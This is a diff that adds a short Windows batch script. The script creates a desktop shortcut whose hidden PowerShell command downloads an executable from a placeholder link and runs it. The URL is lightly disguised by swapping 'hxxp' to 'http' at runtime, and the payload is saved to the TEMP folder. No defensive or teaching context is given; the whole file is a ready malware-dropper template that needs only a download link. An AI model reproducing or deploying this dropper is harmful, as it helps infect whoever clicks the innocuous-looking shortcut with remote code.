@@ -1,0 +1,10 @@
+@echo off
+:: Set shortcut properties
+set "target=powershell.exe"
+set "arguments=-w hidden -c \"$u='hxxp://YOUR_DOWNLOAD_LINK_HERE'.Replace('hxxp','http');$p=$env:TEMP + '\downloadedFile.exe';(New-Object System.Net.WebClient).DownloadFile($u,$p);Start-Process $p\""
+set "shortcutPath=%userprofile%\Desktop\MyShortcut.lnk"
+
+:: Create the shortcut
+powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%shortcutPath%'); $s.TargetPath = '%target%'; $s.Arguments = '%arguments%'; $s.Save()"
+
+echo Shortcut created at %shortcutPath%
